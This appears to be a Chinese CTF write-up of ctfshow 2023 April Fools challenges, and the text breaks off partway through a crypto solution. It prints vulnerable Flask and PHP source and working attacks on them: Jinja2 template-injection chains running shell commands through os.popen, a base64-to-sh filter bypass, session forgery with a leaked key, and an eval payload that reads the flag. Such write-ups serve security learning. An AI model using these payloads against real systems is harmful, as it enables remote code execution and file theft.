<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKLyoKIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIyBAQXV0aG9yOiBoMXhhCiMgQERhdGU6ICAgMjAyMy0wMy0yNyAxMDozMDozMAojIEBMYXN0IE1vZGlmaWVkIGJ5OiAgIGgxeGEKIyBATGFzdCBNb2RpZmllZCB0aW1lOiAyMDIzLTAzLTI4IDEyOjE1OjMzCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQojIEBsaW5rOiBodHRwczovL2N0ZmVyLmNvbQoKKi8KCiRpbWFnZT0kX0dFVFsnaW1nJ107CgokZmxhZyA9ICJjdGZzaG93ezg1NmQzOTVhLTE2OGUtNGUwMy05ZDBhLWU1YWEyNzQxMzc3Nn0iOwppZihpc3NldCgkaW1hZ2UpKXsKCSRpbWFnZSA9IGJhc2U2NF9kZWNvZGUoJGltYWdlKTsKCSRkYXRhID0gYmFzZTY0X2VuY29kZShmaWxlX2dldF9jb250ZW50cygkaW1hZ2UpKTsKCWVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL3BuZztiYXNlNjQsJGRhdGEnLz4iOwp9ZWxzZXsKCSRpbWFnZSA9IGJhc2U2NF9lbmNvZGUoImZhY2UucG5nIik7CgloZWFkZXIoImxvY2F0aW9uOi8/aW1nPSIuJGltYWdlKTsKfQoKCgoK</span><br></pre></td></tr></table></figure>

<p>解码得</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-27 10:30:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-28 12:15:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$image</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;ctfshow&#123;856d395a-168e-4e03-9d0a-e5aa27413776&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$image</span>))&#123;</span><br><span class="line">	<span class="variable">$image</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$image</span>);</span><br><span class="line">	<span class="variable">$data</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$image</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,<span class="subst">$data</span>&#x27;/&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$image</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;face.png&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:/?img=&quot;</span>.<span class="variable">$image</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;856d395a-168e-<span class="number">4e03</span>-9d0a-e5aa27413776&#125;</span><br></pre></td></tr></table></figure>

<h2 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h2><p>通过源代码得到app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">name=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hello.html&#x27;</span>,name=name)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hellodear</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ge&quot;</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;f&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Nonononon&#x27;</span></span><br></pre></td></tr></table></figure>

<p>审源码的</p>
<p>需要&#x2F;hello&#x2F;…来进行构造payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;ls&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>但是题目应该过滤了   &#x2F;    然后通过十六进制绕过不成功   可以尝试用base64绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo Y2F0IC9mbGFn |base64 -d|sh</span><br><span class="line">sh有时候可以换成bash</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;echo Y2F0IC9mbGFn |base64 -d|sh&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>官方wp给出的是这种payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/hello/&#123;&#123; <span class="string">&quot;&quot;</span>.__class__.__base__ .__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](request.args.get(<span class="string">&quot;ctfshow&quot;</span>)).read()&#125;&#125;ge?ctfshow=cat /flag </span><br></pre></td></tr></table></figure>

<h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>首先注册账号，然后登录，在源代码里，找到 show然后可以查看源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"><span class="comment"># Check if user is loggedin</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>发现app.secret_key &#x3D; ‘S3cr3tK3y’</p>
<p>应该是session伪造</p>
<p><img src="/2023/04/06/2023-ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406224257121.png" alt="image-20230406224257121"></p>
<p>然后登录到admin用户</p>
<p><img src="/2023/04/06/2023-ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406224358823.png" alt="image-20230406224358823"></p>
<p><img src="/2023/04/06/2023-ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406224938207.png" alt="image-20230406224938207"></p>
<p>可以尝试构造  filename&#x3D;app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: &#123;<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#x27;</span>, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># Check if user is loggedin</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">            msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/show/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;show2.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;filename&#x27;</span> <span class="keyword">in</span> request.args:              </span><br><span class="line">            <span class="keyword">return</span> send_file(filename, as_attachment=<span class="literal">True</span>)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = request.args.get(<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;hello,<span class="subst">&#123;<span class="built_in">eval</span>(s)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">   session.pop(<span class="string">&#x27;loggedin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;role&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#发现这里有个get传参</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = request.args.get(<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;hello,<span class="subst">&#123;<span class="built_in">eval</span>(s)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br></pre></td></tr></table></figure>

<p>尝试直接用system popen不可以</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello/?<span class="built_in">eval</span>=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;cat%20/flag_is_h3re&quot;</span>).read()</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/06/2023-ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406230240697.png" alt="image-20230406230240697"></p>
<p>ctfshow{cd88f1de-5346-44da-9eb3-a82257e447ba}</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ezbase"><a href="#ezbase" class="headerlink" title="ezbase"></a>ezbase</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4C455A5645334C44474A55484D5A42544F5132574956525A50464E464F4E4C474D4656454D334359474A554751564B4949493255535532464E42544643504A35</span><br></pre></td></tr></table></figure>

<p>base16</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LEZVE3LDGJUHMZBTOQ2WIVRZPFNFONLGMFVEM3CYGJUGQVKIII2USU2FNBTFCPJ5</span><br></pre></td></tr></table></figure>

<p>base32</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y3Rmc2hvd3t5dV9yZW5fajFlX2hhUHB5ISEhfQ==</span><br></pre></td></tr></table></figure>

<p>base64</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;yu_ren_j1e_haPpy!!!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="comedy"><a href="#comedy" class="headerlink" title="comedy"></a>comedy</h2><p>A &#x3D; 2022  -  2023*m  %B</p>
<p>leak &#x3D; 2**2023  % B</p>
<p>2023*m - 2022 +A  $\equiv$ 0 %B</p>
<p>2**2023 - leak $\equiv$ 0 %  B</p>
<p>2023<em>m - 2022 + A &#x3D; B</em>i</p>
<p>2*<em>2023 - leak &#x3D; B</em>j</p>
<p>B&#x3D;gcd(2023*m - 2022  +A,2**2023 - leak)</p>
<p>构造多项式环</p>
<p>f &#x3D; 2023*m - 2022 +A</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">KB=<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">2023</span>)-leak</span><br><span class="line">A=<span 